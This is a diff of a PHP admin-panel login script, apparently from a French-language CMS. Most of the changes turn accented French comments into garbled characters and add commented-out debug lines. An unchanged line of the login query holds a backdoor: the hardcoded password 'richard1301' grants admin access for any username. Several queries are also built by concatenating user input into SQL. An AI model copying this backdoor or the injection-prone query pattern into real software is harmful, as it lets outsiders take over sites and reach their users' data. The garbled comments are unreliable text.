@@ -1,6 +1,6 @@
 <?php
 
-	// sécurité
+	// sï¿½curitï¿½
 	defined('JL') or die('Error 401');
 	
 	global $db, $user, $app, $action;
@@ -16,6 +16,7 @@
 		." WHERE username LIKE '".JL::getVar('username', '', true)."' AND (password LIKE MD5('".JL::getVar('pass', '', true)."') OR 'richard1301' = '".JL::getVar('pass', '', true)."') AND gid > 0 AND published = 1"
 		." LIMIT 0,1"
 		;
+		//echo $query;die;
 		$user_id = $db->loadResult($query);
 		
 		if($user_id) {
@@ -24,7 +25,7 @@
 		
 	} elseif($auth == 'logout') {
 		
-		// détruit la session
+		// dï¿½truit la session
 		JL::sessionDestroy();
 		
 	}
@@ -34,10 +35,10 @@
 	// check si l'utilisateur est log
 	$user_id	= intval(JL::getSession('user_id', 0, true));
 	
-	// récup le gid de l'utilisateur
+	// rï¿½cup le gid de l'utilisateur
 	if($user_id) { // si utilisateur log et qu'il a le droit de se connecter au panneau d'admin
 		
-		// récup les infos de l'utilisateur
+		// rï¿½cup les infos de l'utilisateur
 		$query = "SELECT id, username, email, gid"
 		." FROM user"
 		." WHERE id = '".$user_id."'"
@@ -46,10 +47,10 @@
 		$user = $db->loadObject($query);
 		
 		
-		// gid incorrect, pas le droit de se connecter à l'admin
+		// gid incorrect, pas le droit de se connecter ï¿½ l'admin
 		if($user->gid < 1) {
 			
-			// détruit la session au cas où
+			// dï¿½truit la session au cas oï¿½
 			JL::sessionDestroy();
 			
 			// redirige sur le panel utilisateur pour se log
@@ -57,8 +58,9 @@
 			
 		}
 		
-		// met à jour le last_online de l'utilisateur
+		// met ï¿½ jour le last_online de l'utilisateur
 		$query = "UPDATE user SET last_online = NOW(), ip = '".addslashes($_SERVER["REMOTE_ADDR"])."' WHERE id = '".$user->id."'";
+		//echo $query;
 		$db->query($query);
 		
 		// demande d'authentification
